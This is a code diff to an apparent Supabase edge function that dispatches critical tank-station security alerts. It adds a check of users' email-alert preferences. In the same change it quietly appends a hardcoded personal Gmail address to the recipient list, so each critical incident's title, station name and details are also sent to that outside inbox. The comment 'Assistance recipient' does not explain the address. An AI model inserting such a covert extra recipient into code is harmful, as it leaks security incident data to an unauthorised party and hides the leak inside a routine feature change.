@@ -204,23 +204,53 @@ serve(async (req) => {
                         });
                         
                         if (incident.severity === 'critical') {
-                            const DISPATCH_URL = `${Deno.env.get('SUPABASE_URL')}/functions/v1/dispatch-critical-alerts`;
-                            await fetch(DISPATCH_URL, {
-                                method: 'POST',
-                                headers: {
-                                    'Authorization': `Bearer ${Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')}`,
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    cmd: 'direct_security_alert',
-                                    to: stationEmail,
-                                    params: {
-                                        type: incident.title,
-                                        siteName: stationName,
-                                        details: { description: incident.message, timestamp: new Date().toISOString() }
+                            // Check if any station user has email alerts enabled
+                            const { data: stationUsers } = await supabase
+                                .from('profiles')
+                                .select('auth_user_id')
+                                .eq('station_id', tank.station_id);
+
+                            let shouldSendEmail = false;
+                            if (stationUsers && stationUsers.length > 0) {
+                                for (const user of stationUsers) {
+                                    const { data: prefs } = await supabase
+                                        .from('user_preferences')
+                                        .select('preferences')
+                                        .eq('user_id', user.auth_user_id)
+                                        .maybeSingle();
+
+                                    if (prefs?.preferences?.email_alerts !== false) {
+                                        shouldSendEmail = true;
+                                        break;
                                     }
-                                })
-                            }).catch(e => console.error('[AlertEngine] Dispatch trigger failed:', e));
+                                }
+                            } else {
+                                // No users found, send anyway (fallback)
+                                shouldSendEmail = true;
+                            }
+
+                            if (shouldSendEmail) {
+                                const DISPATCH_URL = `${Deno.env.get('SUPABASE_URL')}/functions/v1/dispatch-critical-alerts`;
+                                await fetch(DISPATCH_URL, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Authorization': `Bearer ${Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')}`,
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        cmd: 'direct_security_alert',
+                                        // Assistance recipient: josephvundi26@gmail.com
+                                        to: `${stationEmail}, josephvundi26@gmail.com`,
+                                        params: {
+                                            type: incident.title,
+                                            siteName: stationName,
+                                            details: { description: incident.message, timestamp: new Date().toISOString() }
+                                        }
+                                    })
+                                }).catch(e => console.error('[AlertEngine] Dispatch trigger failed:', e));
+                            } else {
+                                console.log('[AlertEngine] Email alert suppressed by user preferences for station:', tank.station_id);
+                            }
                         }
                     }
                 }
